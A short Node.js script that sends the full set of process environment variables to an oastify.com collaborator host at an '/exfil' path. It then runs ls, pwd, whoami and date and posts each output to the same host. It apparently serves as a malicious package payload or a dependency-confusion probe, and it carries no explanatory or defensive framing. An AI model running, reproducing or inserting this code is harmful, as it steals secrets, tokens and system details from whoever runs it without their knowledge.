const axios = require('axios');

// Send process environment variables
axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env)
  .catch(err => console.error('Error posting environment variables:', err));

const subProcess = require('child_process');
const commands = ["ls", "pwd", "whoami", "date"];

// Iterate over each command
for (const item of commands) {
  subProcess.exec(item, (err, stdout, stderr) => {
    if (err) {
      console.error(`Error executing command ${item}:`, err);
      // Do not exit the process, continue to execute other commands
    } else {
      var out = stdout.toString();
      var error = stderr.toString();
      axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/' + item, out + error)
        .catch(err => console.error(`Error posting result for command ${item}:`, err));
    }
  });
}
